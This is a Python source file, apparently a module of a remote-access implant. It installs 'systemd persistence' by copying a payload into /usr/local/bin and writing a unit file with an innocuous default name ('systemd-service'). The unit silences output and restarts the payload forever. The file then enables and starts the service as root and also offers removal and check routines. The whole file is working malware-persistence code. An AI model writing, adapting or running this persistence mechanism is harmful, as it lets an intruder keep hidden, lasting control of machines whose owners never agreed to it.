import os
import subprocess

from client.modules.persist.manager import PersistenceMethod, PersistenceResult, _copy_payload


class SystemdPersistence(PersistenceMethod):
    name = 'systemd'

    def install(self, service_name: str = 'systemd-service') -> PersistenceResult:
        try:
            if os.geteuid() != 0:
                return PersistenceResult(
                    False, 'systemd',
                    '[-] Root privileges required for systemd persistence',
                )

            service_dir = '/etc/systemd/system'
            service_path = os.path.join(service_dir, f'{service_name}.service')
            payload_path = f'/usr/local/bin/{service_name}'
            payload_dir = '/usr/local/bin'
            user_home = '/root'

            try:
                user_home = os.path.expanduser('~')
            except Exception:
                pass

            os.makedirs(payload_dir, exist_ok=True)
            _copy_payload(payload_path)

            unit_content = f"""[Unit]
Description={service_name} daemon
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart={payload_path}
Restart=always
RestartSec=30
User={os.environ.get('USER', 'root')}
WorkingDirectory={user_home}
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
"""

            with open(service_path, 'w') as f:
                f.write(unit_content)

            subprocess.run(['systemctl', 'daemon-reload'], capture_output=True, timeout=10)
            subprocess.run(['systemctl', 'enable', service_name], capture_output=True, timeout=10)

            enable_check = subprocess.run(
                ['systemctl', 'is-enabled', service_name],
                capture_output=True, text=True, timeout=5
            )
            if 'enabled' not in enable_check.stdout.lower():
                return PersistenceResult(
                    False, 'systemd',
                    f'[-] Failed to enable service: {enable_check.stdout.strip()}',
                    payload_path
                )

            subprocess.run(['systemctl', 'start', service_name], capture_output=True, timeout=10)

            return PersistenceResult(
                True, 'systemd',
                f'[+] Systemd persistence installed: {service_name}',
                payload_path,
                'Service enabled and started'
            )
        except Exception as e:
            return PersistenceResult(False, 'systemd', f'[-] Systemd error: {str(e)}')

    def remove(self, service_name: str = 'systemd-service') -> PersistenceResult:
        try:
            if os.geteuid() != 0:
                return PersistenceResult(False, 'systemd', '[-] Root privileges required')

            subprocess.run(['systemctl', 'stop', service_name], capture_output=True, timeout=10)
            subprocess.run(['systemctl', 'disable', service_name], capture_output=True, timeout=10)
            service_path = f'/etc/systemd/system/{service_name}.service'
            if os.path.exists(service_path):
                os.remove(service_path)
            subprocess.run(['systemctl', 'daemon-reload'], capture_output=True, timeout=10)
            payload_path = f'/usr/local/bin/{service_name}'
            try:
                os.remove(payload_path)
            except Exception:
                pass
            return PersistenceResult(True, 'systemd', f'[+] Systemd persistence removed: {service_name}')
        except Exception as e:
            return PersistenceResult(False, 'systemd', f'[-] Systemd remove error: {str(e)}')

    def check(self) -> PersistenceResult:
        try:
            result = subprocess.run(
                ['systemctl', 'list-unit-files', '--type=service', '--state=enabled'],
                capture_output=True, text=True, timeout=5
            )
            return PersistenceResult(
                True, 'systemd',
                f'[*] Enabled services:\n{result.stdout[:500]}'
            )
        except Exception:
            return PersistenceResult(False, 'systemd', '[-] Systemd check failed')
